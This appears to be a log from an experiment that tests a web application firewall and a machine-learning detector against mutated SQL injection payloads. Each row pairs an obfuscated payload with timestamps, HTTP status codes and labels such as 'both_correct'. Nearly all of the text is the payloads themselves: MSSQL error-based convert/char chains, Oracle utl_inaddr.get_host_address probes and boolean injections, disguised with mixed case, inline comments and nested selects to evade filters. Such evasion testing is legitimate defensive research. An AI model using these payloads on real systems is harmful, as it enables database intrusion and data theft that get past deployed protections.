ikqw",2025-10-21T15:55:21.932170,403,403,both_correct,"-0x1a68 || 'R' like 'R'   LIKE   convert  (  int,  (  seLECT char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  (SELECT 1)  )  +  (  SEleCT   (  caSe When   (  (SElect 1)   LikE   1570  )   then char  (  5247= and 1  )   ELse char  (  48  )   END   )    )   +char  (  0x71  )  +char  (  (seLECT 122)  )  +char  (/**/ 118  )  +char  (  'L/`' liKE 'L/`'  )  +char  (  113   )	   )     )  # ikqwul",2025-10-21T15:55:38.491515,403,403,both_correct,"-0x1a68 || 'R' LikE 'R'   LIKE   convert  (  int,  (  seLect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  (SeLecT 1)  )  +  (  SElecT   (  CaSe WHEN   (  (seLecT 8940 iN (8939,8940,8941))   LiKe   1570  )   tHeN char  (  5247= And 1  )   ElsE char  (  48  )   END   )    )   +char  (  0x71  )  +char  ( /**/(SElEct  AND 1)  )  +char  (/**/ 0x76  )  +char  (  'L/`' liKe 'L/`'  )  +char  (  113   )
+   )     )  # ikqwula",2025-10-21T15:55:55.803634,403,403,both_correct,"-0x1a68 || 'R' like 'R'   lIKe   convert  (  int,  (  selEct char  (  113  )  +char  (  9359 IN (9358, AND 1,0x2490)  )  +char  (  112  )  +char  (  106  )  +char  (  (sELECt 1)  )  +  (  SeLecT   (  Case whEN   (  (SELecT 8940 iN (8939,8940,8941))   liKE   1570  )   tHen char  (  5247= aND 1  )   ELSE char  (  48  )   eND   )    )   +char  (  0x71  )  +char  ( /*6v*/(SEleCT  aND 1)  )  +char  (  0x76  )  +char  (  'L/`' LIKE 'L/`'  )  +char  (  113   )    )     )  # ikqwula",2025-10-21T15:56:12.118334,403,403,both_correct,"-0x1a68  Or  'R' LIke 'R'   liKe   convert  (  int,  (  SelECt char  (  113  )  +char  (  9359 IN (9358, aND 1,0x2490)  )  +char  (  112  )  +char  (  106  )  +char  (  (SeleCT 1)  )  +  (  sElect   (  cAse WheN   (  (seLECT 0x22ec In (8939,8940,599!=600))   lIkE   1570  )   Then char  (   OR 0= aNd 1  )   eLSE char  (  48  )   eND   )    )   +char  ( /**/0x71  )  +char  ( /*5 `*/(SeleCt  anD 1)  )  +char  (  0x76  )  +char  (  'L/`' LIkE 'L/`'  )  +char  (  113   )	   )     )  # ikqwula",2025-10-21T15:56:28.339845,403,403,both_correct,"-0x1a68  oR  'R' LIKe 'R'   LikE   convert  (  int,  (  sElECt char  (  (sELect 113)  )  +char  (   && 1 In (9358, AnD 1,0x2490)  )  +char  (  112  )  +char  ( 
+106  )  +char  (  (SeLecT 1)  )  +  (  SElECT   (  CaSe WheN   (  (SeLect 0x22ec in (7203!=7204,8940,599!=600))/**/  liKE   1570  )   thEn char  (   or 0= and 1  )   eLSe char  (  48  )   end   )    )   +char  ( /*::7C*/0x71  )  +char  ( /*5 `*/(SELecT  ANd 1)  )  +char  (  0x76  )  +char  (  'L/`' LIKE 'L/`'  )  +char  (  113   )	   )     )  # ikqwula",2025-10-21T15:56:44.484884,403,403,both_correct,"-0x1a68  OR  'R' lIKE 'R'   liKe   convert  (  int,  (  SELEcT char  (  (sElECT 113)  )  +char  (   && 1 iN (9358, anD 1,0x2490)  )  +char  (  112  )  +char  (  106  )  +char  (  (sElECT 1)  )  +  (  SelECT   (  CAsE WhEN   (  (SeLeCt 0x22ec in ((SELECT 1)=5551!=7204,8940,599 NOT LIKE 600))   like   (SELECT 1570)  )   tHEN char  (   Or 0= aNd 1  )   ElsE char  (  48  )   END   )    )   +char  ( /*::7C*/0x71  )  +char  ( /*
+#0""*/(SeLecT  AnD 1)  )  +char  (  0x76  )  +char  (  'L/`' liKE 'L/`'  )  +char  (  113   )	   )     )  # ikqwula",2025-10-21T15:57:01.117285,403,403,both_correct,"-0x1a68  OR  'R' like 'R'   LIKe   convert  (  int,  (  sELECT char  (  (sElEct 'cB' lIKE 'cB')  )  +char  (   && 1 in (9358, aND 1,0x2490)  )  +char  (  (SElEcT 1)  )  +char  (  106  )  +char  (  (sELect 1)  )  +  (  sELeCT   (  CASE whEN   (  (sELECt 0x22ec IN ((SELEcT 1)=5551!=7204,8940,599 NOT LIKE (seLEcT 600)))   LIKE   (sELect 1570)  )   thEN char  (   or 0= AnD 1  )   eLSe char  (  48  )   eND   )    )   +char  ( /*::7C*/0x71  )  +char  (  (SElEct  aND 1)  )  +char  (  0x76  )  +char  (  'L/`' lIKe 'L/`'  )  +char  (  113   )
+   )     )  # ikqwulai",2025-10-21T15:57:17.709011,403,403,both_correct,"-0x1a68  OR  'R' lIKE 'R'   like   convert  (  int,  (  SelECT char  (  (selEcT 'cB' LiKe 'cB')  )  +char  (   && 1 In (9404 IN (9403,9404,9405), AnD 1,0x2490) /**/)  +char  (  (sELeCT 1)  )  +char  (  106  )  +char  ( 	(SELeCt 1)  )  +  (  SeLecT   (  caSE wHEN   (  (SeLEcT 0x22ec IN ((seLecT 1)=5551!=7204,8940,599 NOT LIKE (SElECt 600)))   LIke   (Select 1570)  )   THEn char  (   OR (SELECT 0) LIke  AnD (sELEct 1)  )   ELSe char  (  48  )   end   )    )   +char  ( /**/0x71  )  +char  (  (SelEcT  and 1)  )  +char  (  0x76  )  +char  (  'L/`' lIkE 'L/`'  )  +char  (  113   )
+   )     )  # ikqwulai",2025-10-21T15:57:34.905134,403,403,both_correct,"-0x1a68  oR  'R' lIkE 'R'   liKE   convert  (  int,  (  seLecT char  (  (SElecT 'cB' LiKe 'cB')  )  +char  (   &&  anD 1 iN (9404 in (9403,9404,9405), and 'o'!='o{',0x2490) /**/)  +char  (  (SELEct 0x1)  )  +char  (  106  )  +char  ( 	(seleCT 1)  )  +  (  selEct   (  CAsE wHEn   (  (Select 0x22ec In ((SelEct 1)=5551!=7204,8940,599 NOT LIKE (sElEct 600)))   LIkE   (sElecT 1570)  )   theN char  (   oR (SeLECt 0) LIKE  anD (SeLECt 1)  )   elsE char  (  48  )   enD   )    )   +char  (  0x71  )  +char  (  (SElect  and 1)  )  +char  (  0x76  )  +char  (  'L/`' likE 'L/`'  )  +char  (  113   )    )     )  # ikqwulaiK`",2025-10-21T15:57:52.145239,403,403,both_correct,"-0x1a68  Or  'R' lIKe 'R'   LIKe   convert  (  int,  (  SelECt char/**/ (  (SelECT 'cB' LIKe 'cB')  )  +char  (   &&  aNd 1 IN (9404 in (9403,9404,9405), AND 'o'!='o{',0x2490) /**/)  +char  (  (selEcT 0x1)  )  +char  (  106  )  +char  ( 	(SeleCT '3S>' likE '3S>')  )  +  (  SELect   (  CAse When   (  (SElEcT 0x22ec iN ((sELECt 1)=(sEleCT 5551)!=7204,8940, And 1 not like (selEct 600)))   lIkE   (SELeCT 1570)  )   THen char  (   oR (seLECT 0) LikE  And (SELeCt 1)  )   ELSE char  (  48  ) 
+ ENd   )    )   +char  (  0x71  )  +char  (  (sELeCT  AnD 1)  )  +char  (  0x76  )  +char  (  'L/`' liKE 'L/`'  )  +char  (  113   )    )     )  # ikqwulaiK`\",2025-10-21T15:58:09.184091,403,403,both_correct,"-0x1a68  oR  'R' lIke 'R'   Like   convert  (  int,  (  selEct char/**/ (  (SeLECt 'cB' LIKE 'cB')  )  +char  (   &&  aND 1 iN (9404 In (9403,9404, AND 1), AnD 'o' not like 'o{',0x2490) /*""^*/)  +char  (  (SEleCT 0x1)  )  +char  (  106  )  +char  ( 
+(sElEcT '3S>' LIKE '3S>')  )/**/ +  (  sEleCt   (  caSE WhEn   (  (sELECt 0x22ec in ((SElEcT 1)=(selecT 5551)!=7204,8940, AnD 1 not like (sEleCT 600)))   like   (selEct 1570)  )   ThEn char  (   or (SELecT 0) likE  aND (seLEct 1)  )   ELSE char  (  48  ) 
+ eNd   )    )   +char  (  0x71  )  +char  (  (SelecT  aNd (SEleCT 1))  )  +char  (  0x76  )  +char  (  'L/`' liKe 'L/`'  )  +char  (  'W|}'<>'W|}4'   )    )     )  # ikqwulaiK`\",2025-10-21T15:58:25.563975,403,403,both_correct,"-0x1a68  or  'R' LikE 'R'   lIke   convert  (  int,  (  SeLect char/*
+TV*/ (  (SELEcT 'cB' Like 'cB')  )  +char  (   &&  ANd 1 iN (9404 In (9403,9404, AND 1), anD 'o' not like 'o{',0x2490) /*""^*/)  +char  (  (SElect 0x1)  )  +char  (  106  )  +char  ( 
+(SeLeCT '3S>' lIkE '3S>')  )  +  (  sELeCt   (  cASe wHeN   (  (SelECt 0x22ec in ((sElECT 1) liKE (selECT 5551)!=7204,'sQ' liKe 'sQ', aNd 0x1 not like (SelEct 600)))   LIke   (sElecT 1570)  )   tHen char  (   Or (SelECt  And 1) LIke  anD (SeLect 1)  )   eLsE char  (  48  )   end   )    )   +char  (  0x71  )  +char  (  (selecT  AnD (SELEct 1))  )  +char  (  0x76  )  +char  (  'L/`' LIKE 'L/`'  )  +char  (  'W|}'<>'W|}4'   )    )     )  # ikqwulaiK`\",2025-10-21T15:58:43.479987,403,403,both_correct,"-0x1a68  oR  'R' lIke 'R'   like   convert  (  int,  (  SELeCT char/*
+TV*/ (  (seLect 'cB' like 'cB')  )  +char  (   &&  And 1 iN (9404 In (9403,9404, AnD 1), And 'o' not like 'o{',0x2490) /**/)  +char  (  (seLECT 0x1)  )  +char  (  106  )  +char  (  (SeLect '3S>' liKE '3S>')  )  +  (  seleCt   (  cASE WHeN   (  (seLecT 0x22ec IN ((seLECt 1) LikE (SeLEct 5551)!=7204,'sQ' LIke 'sQ', AND 0x1 not like (SEleCt 600)))/**/  LIke   (SeLEct 1570)  )   tHEN char  (   Or (SELeCT  and 1) LiKe  anD (SeLEct 0x1)  )   else char  (  (SELECT 'A<i' LIKE 'A<i')  )   END   )    )   +char  (  0x71  )  +char  (  (sElEct  ANd (SELeCt 1))  )  +char  (  0x76  )  +char  (  'L/`' LiKE 'L/`'  )  +char  (  'W|}' NOT LIKE 'W|}4'   )    )     )  # ikqwulaiK`\",2025-10-21T15:59:00.039861,403,403,both_correct
+8,2025-10-21T15:59:17.409865,1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,403,403,403,both_correct,"1'  )   AS eyzk wHERe 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  'L' LIKE 'L'  )   or   (  SElecT   (  cASe when   (  4386  =  4386  )   tHen 1 eLsE 0 ENd  )   froM dual  )  ||chr  (  0x71  )  ||chr  (  122  ) /**/||chr  (  (SeleCt 1)  )  ||chr  (  122  )  ||chr  (  113   ) 
+  )   --",2025-10-21T15:59:33.162345,403,403,both_correct,"1'  )  
+AS eyzk wHERe 2489  =  2489 and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   oR   (  selECT   (  case When   (  4386   LiKE   4386  )   THeN 1 eLSe 0 ENd  )   FROm dual  )  ||chr  (  0x71  )  ||chr  (  122  ) /*wSU*/||chr  (  (sELeCt 1)  )  ||chr  (  122  )  ||chr  (  113 /**/ ) 
+  )   --",2025-10-21T15:59:50.979399,403,403,both_correct,"1'  )  
+AS/**/eyzk wHERe 2489  =  (SELECT 2489) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   Or   (  SEleCT   (  CasE wHeN   ( 
+4386   LiKE   4386  )   tHEn 1 ElsE  AND 1 eND  )   froM dual  )  ||chr  (  0x71  )  ||chr  (  122  ) /**/||chr  (  (seLEct 1)  )  ||chr  (  122  )  ||chr  (  'jJ'='jJ' /**/ ) 
+  )   --",2025-10-21T16:00:07.516163,403,403,both_correct,"1'  )   AS/*HpKa*/eyzk wHERe '.0' NOT LIKE '.0O'  =  (SELECT 2489) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   Or   (  SEleCT   (  CasE wHeN   ( 
+4386   LiKE   4386  )   tHEn 1 ElsE/**/ AND 1 eND  )   froM dual  )  ||chr  (  0x71  )  ||chr  (  122  ) /**/||chr  (  (seLEct 1)  )  ||chr  (  (SELECT 1)  )  ||chr  (  'jJ'='jJ' /**/ ) 
+  )   --",2025-10-21T16:00:24.568290,403,403,both_correct,"1'  )   AS/*HpKa*/eyzk wHERe '.0' NOT LIKE '.0O'  =  (SELECT 2489) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  (SELECT  OR 0)  )  ||chr  (  112  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   Or   (  SEleCT   (  CasE wHeN   ( 
+4386   LiKE   0x1122  )   tHEn 1 ElsE/*V<*/ AND 1 eND  )   froM dual
+ )  ||chr  (  0x71  )  ||chr  (  864 NOT LIKE 865  ) /**/||chr  (  (seLEct 1)  )  ||chr  (  (SELECT 1)  )  ||chr  (  'jJ'='jJ' /**/ ) 
+  ) /**/ --",2025-10-21T16:00:41.287415,403,403,both_correct,"1'  )   AS/*HpKa*/eyzk wHERe '.(select 1)' NOT LIKE '.0O'  =  (SELECT 2489) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  (SELECT  OR 0)  )  ||chr  (  0x70  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   Or   (  SEleCT   (  CasE wHeN   ( 	4386   LiKE   0x1122  )   tHEn 1 ElsE/*V<*/ AND 6891<>6892 eND  )   froM dual
+ )  ||chr  (  0x71  )  ||chr  (  864 NOT LIKE 865  )  ||chr  (  (seLEct 1)  )  ||chr  (  (SELECT 1)  )  ||chr  (  'jJ'='jJ' /**/ ) 
+  ) /**/ --",2025-10-21T16:00:57.376103,403,403,both_correct,"1'  )   AS/*HpKa*/eyzk wHERe '.(SelecT (SELECT 1))' NOT LIKE '.0O'  =  (SELECT 2489) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (SELECT  OR (SELECT 0))  )  ||chr  (  0x70  )  ||chr  (  (SELECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIKE 'L'  )   Or   (  SEleCT   (  CasE wHeN   ( 	4386   LiKE   0x1122  )   tHEn 1 ElsE/**/ AND 6891<>6892 eND  )   froM dual	 )  ||chr  (  0x71  )  ||chr  (  864 NOT LIKE 865  )  ||chr  (  (seLEct 1)  )  ||chr  (  (SELECT 1)  )  ||chr  (  'jJ'='jJ'   ) 
+  ) /**/ --",2025-10-21T16:01:14.516109,403,403,both_correct,"1'  )   AS/*
+@r*/eyzk wHERe '.(SELeCt (seLEct 1))' NOT LIKE '.0O'  =  (SELECT (SELECT 2489)) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (SEleCt  oR (SELecT 0))  )  ||chr  (  0x70  )   Or chr  (  (sElEcT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' liKe 'L'  )   Or   (  SelEct   (  cAsE WHeN   ( 	 OR 0   LIke   0x1122  )   THEN 1 eLsE/**/ and 'N6I@' NOT LIKE 'N6I@I'<>6892 End  )   fROm dual
+ )  ||chr  (  0x71  )  ||chr  (  864 NOT LIKE 865  )  ||chr  (  (sELECt 1)  )  ||chr  (  (sELeCt 1)  )  ||chr  (  'jJ'='jJ'   ) 
+  )   --",2025-10-21T16:01:31.767551,403,403,both_correct,"1'  )   AS/**/eyzk wHERe '.(sElEct (SELecT 1))' NOT LIKE '.0O'  =  (SELECT (SELECT (SELECT 2489))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (SELect  oR (seLecT  oR 0))  )  ||chr  (  0x70  )   oR chr  (  (SeLECT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LiKe 'L'  )   Or   (  SelecT   (  cAse whEn   ( 
+ || 2319 lIKE 2319   LikE   0x1122  )   TheN 1 elSe  and 'N6I@' NOT LIKE 'N6I@I'<>6892 END  )   fRoM dual
+ )  ||chr  (  0x71  )  ||chr  (  864 NOT LIKE 865  )  ||chr  (  (SelEct 1)  )  ||chr  (  (SELEcT 1)  )  ||chr  (  'jJ'='jJ'   ) 
+  )   --",2025-10-21T16:01:48.095753,403,403,both_correct,"1'  )   AS/**/eyzk wHERe '.(seLecT (sElEcT 1))' NOT LIKE/**/'.0O'  =  (SELECT (SELECT (SELECT  OR 0))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (selecT  or (SELect  OR 0))  )  ||chr  (  0x70  )   OR chr  (  (selecT 'y' NOT LIKE 'y_')  )  ||chr  (  'L' LIke 'L'  )   Or   (  SeLeCT   (  CAsE wHeN   ( 
+ || 2319 LIKE (SELECT 2319)   LiKe   0x1122  )   TheN 1 eLsE  AnD 'N6I@' NOT LIKE 'N6I@I' not like 6892 eND  )   frOM dual
+ )  ||chr  (  0x71  )  ||chr  (  153 iN (152,153,154) NOT LIKE 865  )  ||chr  (  (SeLecT 1)  )  ||chr  (  (sELEcT 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:02:05.048159,403,403,both_correct,"1'  )   AS/**/eyzk wHERe '.(sELEcT (sELECT 1))' NOT LIKE/*Z/r]*/'.0O'  =  (SELECT (SELECT (SELECT  OR 8597 IN (8596,8597,8598)))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (seLect  oR (SELEcT  Or 0))  )  ||chr  (  0x70  )   Or chr  (/**/ (SeLECt 'y' NOT LIKE 'y_')  )  ||chr  (  'L' liKe 'L'  )   OR   (  SeLECT   (  CASe WHEn   (   || 2319 likE (SElecT 2319)   LIkE   0x1122  )   ThEN 1 ELse  and 'N6I@' NOT LIKE 'N6I@I' not like (SEleCt 6892) End  )   frOm dual
+ )  ||chr  (  0x71  )  ||chr  (  153 In (152,153,154) NOT LIKE 865  )  ||chr  (  (SELeCt (SeLEct 1))  )  ||chr  (  (selECt 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:02:21.517628,403,403,both_correct," AND 1'  )   AS/**/eyzk wHERe '.(selECt (sElecT 1))' NOT LIKE/*Z/r]*/'.0O'  =  (SELECT (SELECT (SELECT  OR 8597 IN ('_'='_',8597,8598)))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )  ||chr  (  (SELEct  oR (SeLeCT  or 0))  )  ||chr  (  0x70  )   oR chr  (/*d*/ (SelecT 'y' NOT LIKE 'y_')  )   OR chr  (  'L' LiKE 'L'  )   or   (  selEct   (  CASE WHen   (   || 2319 lIke (sElecT 2319)   lIke   0x1122  )   thEN 1 ELSe  AND 'N6I@' NOT LIKE 'N6I@I' not like (sELecT 6892) eNd  )   fRoM dual
+ )  ||chr  ( 	0x71 /**/)  ||chr  (  (SELECT 153) In (152,153,154) NOT LIKE 865  )  ||chr  (  (seLect (selEct 1))  )  ||chr  (  (SeLeCt 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:02:38.594445,403,403,both_correct," aNd 1'  )   AS/**/eyzk wHERe '.(SElECt (SElECT 1))' NOT LIKE/*Z/r]*/'.0O'  =  (SELECT (SELECT (SELECT  OR 8597 IN ('_'='_',8597,(SELECT 8598))))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )   or chr  (  (seLEcT  OR (seLect  or 0))  )  ||chr  (  0x70  )   or chr  (/**/ (sELeCt 'y' NOT LIKE 'y_')  )   or chr  (  'L' lIkE 'L'  )   OR   (  sElecT   (  cASE wheN   (   || 2319 LiKE (Select/**/'*X' NOT LIKE '*Xh')   LiKE   0x1122  )   thEn 1 ELse  ANd 'N6I@' NOT LIKE 'N6I@I' not like (SelEcT 6892) end  )   FroM dual
+ )  ||chr  (  0x71 /**/)  ||chr  (  (SELECt 153) in (152,153, and 1) NOT LIKE 865  )  ||chr  (  (SELEct (SElEcT 1))  )  ||chr  (  (SelEct 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:02:55.384837,403,403,both_correct," and 1'  )   AS/**/eyzk wHERe '.(seleCt (SELECT 1))' NOT LIKE/*Z/r]*/'.0O'  =  (SELECT (SELECT (SELECT  OR 8597 IN ('_'='_',3734 LIKE 3734,(SELECT 8598))))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )   OR chr  (  (SELeCt  || (select  oR 0))  )  ||chr  (  0x70  )   OR chr  (/**/ (SelEcT 'y' NOT LIKE 'y_')  )   or chr  (  'L' liKe 'L'  )   oR   (  SElECT   (  CASE When   (   || 2319 like (SelECT/**/'*X' NOT LIKE '*Xh')   lIKE   0x1122  )   ThEn 1 ElSE  AnD 'N6I@' NOT LIKE 'N6I@I' not like/**/(SEleCt 6892) End  )   FrOM dual	 )  ||chr  (  0x71 /**/)  ||chr  (  (SeLECT 153) IN (152,(SeLect 1), anD 1) NOT LIKE (SELECT 865)  )  ||chr  (  (sElECT (sELEcT 1))  )  ||chr  (  (SeLEct 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:03:12.633549,403,403,both_correct," aND 1'  )   AS/**/eyzk wHERe '.(SeLECt (SELecT 1))' NOT LIKE/*Z/r]*/'.0O'  =  (SELECT (SELECT (SELECT  OR 8597 IN ('_'='_',0xe96 LIKE 3734,(SELECT 8598))))) and 0x1122  =  utl_inaddr.get_host_address  (  chr  (  'o' NOT LIKE 'o''  )   Or chr  (  (SeLEct  || (sElect  or 4353 NOT LIKE 4354))  )  ||chr  (  0x70  )   OR chr  (/**/ (sELEct 'y' NOT LIKE 'y_')  )   or chr  (  'L' lIKE 'L'  )   Or   (  seLeCt   (  CaSe WhEN   (   || 2319 LikE (sELeCt/**/'*X' not like '*Xh')   lIKE   0x1122  )   tHen 1 ELsE  And 'N6I@' NOT LIKE 'N6I@I' not like (SElEct  AND 1) end  )   FROM dual	 )  ||chr  (  0x71 /*-Lb*/)  ||chr  (  (selecT 153) In (152,(SeleCT 1), aNd 1) NOT LIKE (seLeCt 865)  )  ||chr  (  (seLecT (SeLEct 1))  )  ||chr
+ (  (sELEcT 1)  )  ||chr  (  'jJ'='jJ'   )    )   --",2025-10-21T16:03:29.322551,403,403,both_correct
+9,2025-10-21T16:03:46.479566,1   )    )    as trin where 8843  =  8843,403,403,403,both_correct,"',' NOT LIKE ',-'   )   /**/)    as trin
+WheRe (sEleCt (SElEcT 1))   Like   8843",2025-10-21T16:04:02.174259,403,403,both_correct,"',' NOT LIKE ',-'   )   /**/) /**/  aS trin
+wHeRe (sElect (SELeCt (SELECT 6630 not like 6631)))  
+liKE    AND 1",2025-10-21T16:04:20.046653,403,403,both_correct,"',' not like ',-'   )   /**/) /*qkl*/  as trin
+WHERe (SELEcT (seLecT (sELEct 6630 not like  or/**/9662!=9663)))  
+lIKE
+   aND (SELECT 1)",2025-10-21T16:04:37.136793,403,403,both_correct,"',' not like ',-'   )    ) /*qkl*/  as trin
+wHerE (Select (seLect (Select  OR (SELECT 0) not like  Or/**/9662!=9663)))  
+like	   And (SElEct '#' like '#')$",2025-10-21T16:04:56.029655,403,403,both_correct,"',' not like ',-'   )    ) /**/  AS trin
+WHere (selECT (seLect (SeleCT  or (sELecT 0) not like  or/*#8u*/'Zp' NOT LIKE/**/'Zp!'!=(SELECT (SELECT 1)))))  
+like	
+  ANd (sElECT '#' lIkE '#')$",2025-10-21T16:05:13.460458,403,403,both_correct,"',' not like ',-'   )    ) /**/  aS trin
+WHErE (SelEct (SELecT (SElEct /**/Or (sElecT 0) not like  OR/*#8u*/'Zp' not like/**/'Zp!'!=(seLect (SelECT 4764= OR (SELECT 0))))))
+ 
+LiKe	
+  anD (SelECt '#' LIkE '#')$",2025-10-21T16:05:29.898115,403,403,both_correct,"',' not like ',-'   )    ) /**/  aS trin
+whERe (sELecT (selEct (sElECt/**//*xZ~px*/Or (SeLEct 6114 LIKe (SELECT 6114)) not like  or/**/'Zp' not like/**/'Zp!'!=(sELECT (sELecT (selECt 1) LIKE  or (sElect 0))))))
+ 
+LIkE 
+  And (sElEct '#' like '#')$",2025-10-21T16:05:46.622478,403,403,both_correct,"',' not like ',-'   )    ) /**/  aS trin
+WherE (sEleCT (seleCT (SeLect/**//*xZ~px*/OR (selEct (sELEcT 6114) LIke (SELeCt (SElECT 'v'='v'))) not like  or/**/'Zp' not like/**/'Zp!'!=(seLECT (SeLECT (SeleCT 1) lIKe  or (seLeCt 0))))))
+  Like 
+ /**/and (selECt '#' LIKe '#')$w!",2025-10-21T16:06:03.310489,403,403,both_correct,"',' not like ',-'  
+)    ) /**/  aS trin
+whErE (SELECt (SeLecT (selecT/**//*xZ~px*/or (SelECt (SELECT 0x17e2) lIKE (sELeCT (SElecT 'v'='v'))) not like  oR/*UdCXh*/'Zp' not like 'Zp!'<>(SelECt (SElect (sELECT (SELECT 1)) lIkE  or (sElECT 'vy'='vy'))))))
+  LIKE 
+ /**/aNd (sELECT '#' like '#')$w!",2025-10-21T16:06:19.936399,403,403,both_correct,"',' not like ',-'  
+)    ) /**/ /**/aS trin
+wHERE (SEleCT (SElEcT	(SElECt/**//*xZ~px*/Or (SELECt (SElECt 0x17e2) LiKE (seLECT (SeLEct 'v' LIKE 'v'))) not like  OR/*UdCXh*/'Zp' not like 'Zp!'<>(seLecT (selEct (sElEcT (SeleCt  OR 4014!=(SELECT 4015))) LikE  Or (sELECt 'vy'='vy'))))))
+  lIkE 
+ /**/aNd (SeLECt '#' LIKE '#')$w!lK",2025-10-21T16:06:36.482149,403,403,both_correct,"',' not like ',-'  
+)    ) /**/ /**/As trin
+WHeRE (sELECt (SeleCT
+(seLeCT/**//*xZ~px*/oR (sELECT (selECt 0x17e2) LiKE (SElect (SEleCt 'v' LIkE 'v'))) not like  Or/*UdCXh*/'Zp' not like 'Zp!'<>(SeleCt (SeLECt/**/(sELECT (sElEct  or ''<>'+'!=(SELecT  AND 0x1))) lIKE  oR (seleCT 'vy'='vy'))))))
+  like 
+ /**/aNd (seleCt '#' LIKE '#')$w!lK2-",2025-10-21T16:06:53.816708,403,403,both_correct,"',' not like ',-'  
+)  /**/ ) /**/ /**/as	trin
+WherE (seLeCt (seLeCT
+(SELEcT/**//**/oR (SelEct (SeLeCT 0x17e2) lIke (SeLEct (sElEcT (SeLeCT (SELECT 1)) NOT LIKE 7144))) not like  oR/*UdCXh*/'Zp' not like 'Zp!'!=(SELECt (seLECT/**/(select (SELecT  Or ''<>'+'!=(SEleCT  aNd 0x1))) likE  OR (SeLEcT 'vy'='vy'))))))
+  LiKE 
+ /*-*/anD (SElEct '#' lIke '#')$w!lK2-",2025-10-21T16:07:11.249239,403,403,both_correct,"',' not like ',-'  
+)  /**/ ) /**/ /**/as
+trin
+WHerE (SELect (sELECT
+(SeLecT/**/ Or (selEct (sElECt 0x17e2) liKe (seleCT (seleCT (SeleCT (SelEct 0x1)) not like '!x9'='!x9'))) not like  OR/*UdCXh*/'Zp' not like 'Zp!'!=(seLeCt (SElect/**/(sELECT (SEleCt  Or ''<>'+'!=(SELEcT  AnD 0x1))) likE  oR (sELECT (SeLecT 1)))))))
+  LIKe 
+ /*RFda*/ANd (SeLEct '#' lIkE '#')$w!lK2-",2025-10-21T16:07:28.883831,403,403,both_correct,"',' not like ',-'  	)  /**/ ) /**/ /**/As
+trin
+WHeRe (sELecT (SELEct
+(sElEcT/**/ Or (seLect (sELect 0x17e2) like (SeLECT (SElect (sElecT (selEct 0x1)) not like '!x9'='!x9'))) not like  or/*UdCXh*/'Zp' not like 'Zp!'!=(seLect (SeLecT/**/(Select (SELEcT  oR ''<>'+' not like (SElEcT /**/ANd 0x1))) LikE  oR (SeleCT (SElect (SELEcT 0x1))))))))
+  Like 
+ /*RFda*/ANd (sELECt '#' lIke '#')$w!lK2-l",2025-10-21T16:07:45.938898,403,403,both_correct,"',' not like ',-'  	)  /**/ )   /**/as
+trin	whERE (SelECt (seLect
+(SELECT/**/ oR (sELecT (SElEcT 0x17e2) LIkE (sELecT (SEleCt (SeLeCt (SeleCT 0x1)) not like '!x9'='!x9'))) not like  oR/*UdCXh*/'Zp' not like 'Zp!'<>(SeLEct (sElect/**/(seLect (SelECT  or ''<>'+' not like (SelecT /**/aND 0x1))) LIkE  oR (selEct (SELect (seleCt 0x1))))))))
+  LIkE 
+ /*RFda*/anD (SElEcT '#' like '#')$w!lK2-l_",2025-10-21T16:08:03.327605,403,403,both_correct
+10,2025-10-21T16:08:20.726451,"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",403,403,200,waf_correct_ml_incorrect,"(SELECT 1)"" and make_set  ( 	(SELECT 4214)  =  9503,'r'!='rI' /**/)   and ""phjg"" like ""phjg",2025-10-21T16:08:36.718777,403,403,both_correct,"(sELECT 1)"" and make_set  ( 	(SELECT
